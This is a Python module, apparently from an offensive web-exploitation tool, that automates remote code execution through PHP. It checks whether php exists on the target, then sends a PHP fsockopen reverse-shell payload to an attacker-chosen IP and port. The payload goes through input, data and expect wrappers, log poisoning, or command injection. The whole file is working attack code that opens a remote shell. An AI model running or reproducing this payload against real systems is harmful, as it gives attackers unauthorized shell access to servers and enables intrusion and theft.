"""PHP"""
from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.arguments import ArgumentHandler
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo
from src.utils import colors


def exploit_php(exploit, method, ip, port):
    """Exploit PHP"""
    args = ArgumentHandler()
    url = exploit["GETVAL"]
    post = exploit["POSTVAL"]

    phpTest = "which%20php"
    phpPayload = f'php+-r+\'$sock%3dfsockopen("{ip}",{port})%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b\''

    print(
        colors.purple("[?]") + " Checking if php is available on the target system..."
    )

    if method == "INPUT":
        u = url.replace(config.tempArg, encode(phpTest))
        res, _ = request.REQUEST(
            u, args.args['httpheaders'], exploit["POSTVAL"], config.proxies, "", ""
        )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "PHP", "input wrapper")
            request.REQUEST(
                url.replace(config.tempArg, encode(phpPayload)),
                args.args['httpheaders'],
                exploit["POSTVAL"],
                config.proxies,
                "",
                "",
            )

    if method == "DATA":
        if args.args['mode'] == "post":
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args.args['httpheaders'],
                post,
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "PHP", "data wrapper")
            if args.args['mode'] == "post":
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args.args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )

    if method == "EXPECT":
        if args.args['mode'] == "post":
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(phpTest)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "PHP", "expect wrapper")
            if args.args['mode'] == "post":
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(phpPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )

    if method == "TRUNC":
        exploit_log_poison(
            ip, port, url, phpPayload, "", encode(phpTest), "/php", exploit["POSTVAL"]
        )

    if method == "CMD":
        if args.args['mode'] == "post":
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(phpTest)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(phpTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/php" in res.text:
            printInfo(ip, port, "php", "command injection")
            if args.args['mode'] == "post":
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(phpPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(phpPayload)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )
